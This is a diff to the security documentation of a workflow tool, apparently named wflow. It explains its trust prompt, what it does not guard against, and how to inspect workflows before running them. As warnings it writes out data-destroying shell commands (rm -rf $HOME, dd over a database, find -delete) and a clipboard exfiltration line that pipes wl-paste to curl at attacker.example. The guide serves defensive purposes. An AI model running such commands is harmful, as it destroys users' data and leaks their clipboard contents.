@@ -12,14 +12,14 @@ that didn't originate on your machine.
 ## What wflow does on your behalf
 
 - **First-run prompt.** Any workflow file `wflow run` reads that wasn't
-  authored on this machine — i.e., not in `~/.config/wflow/trusted_workflows`
-  for that exact (path, content) pair — triggers a prompt. The prompt
+  authored on this machine, i.e., not in `~/.config/wflow/trusted_workflows`
+  for that exact (path, content) pair, triggers a prompt. The prompt
   prints the title, step count, and a categorized list of what the
   workflow will do, with `shell` and `clipboard` lines highlighted. You
   type `y` to proceed.
 - **Trust is keyed by (path, hash).** Editing the file invalidates trust
   (the SHA-256 changes). Moving the file invalidates trust (the path
-  changes). Both are deliberate — a workflow is the file at this path
+  changes). Both are deliberate, a workflow is the file at this path
   with this content, and either changing means you should re-confirm.
 - **Auto-trust for files wflow itself wrote.** `wflow new`, `wflow edit`
   (after save), and the GUI editor all mark their saved files trusted.
@@ -42,7 +42,7 @@ human-readable and you can diff or grep it freely.
   filesystem namespace, and doesn't filter syscalls.
 - **No content scanning.** wflow doesn't look at the shell commands and
   decide they're "safe." A workflow with `shell "rm -rf $HOME"` and a
-  workflow with `shell "ls"` look identical to the trust check — the
+  workflow with `shell "ls"` look identical to the trust check, the
   only difference is what *you* see in the prompt.
 - **No protection against legitimate-looking but malicious automation.**
   A `notify` action with body "Hello!" can sit alongside a `shell`
@@ -60,7 +60,7 @@ yes:
    `shell "rm -rf $HOME"`,
    `shell "dd if=/dev/zero of=$HOME/important.db"`,
    `shell "find / -name '*.kdl' -delete"`.
-   These are the easy ones — the prompt shows them by category.
+   These are the easy ones, the prompt shows them by category.
 
 2. **Clipboard exfiltration.**
    `shell "wl-paste | curl -d @- https://attacker.example/cb"`.
@@ -87,7 +87,7 @@ yes:
 6. **Social engineering through naming.**
    A workflow titled "Fix Firefox window snapping" that, in step 7,
    shells out somewhere unexpected. The title doesn't tell you what
-   the workflow does — only the steps do.
+   the workflow does, only the steps do.
 
 ## Safety checks before you confirm
 
@@ -98,7 +98,7 @@ wflow show <path>            # human-readable list of every step
 wflow run --explain <path>   # exact subprocess command lines (no execution)
 ```
 
-`wflow run --explain` is the strongest check — it prints the literal
+`wflow run --explain` is the strongest check, it prints the literal
 shell command, wdotool argv, and notify-send invocation each step
 would generate. Read every line. If anything looks unfamiliar, don't
 run it.
@@ -121,8 +121,8 @@ Next `wflow run` of any previously-trusted file will re-prompt.
 
 Cryptographic signing and a notion of "trusted publisher" may land if
 demand surfaces (post-v0.3). The current model is intentionally minimal:
-make sure you've read what's about to run. Anything beyond that — a
-sandbox, signed authors, content scanners — adds complexity that
+make sure you've read what's about to run. Anything beyond that, a
+sandbox, signed authors, content scanners, adds complexity that
 doesn't pay for itself until there's a real ecosystem of shared
 workflows.
 
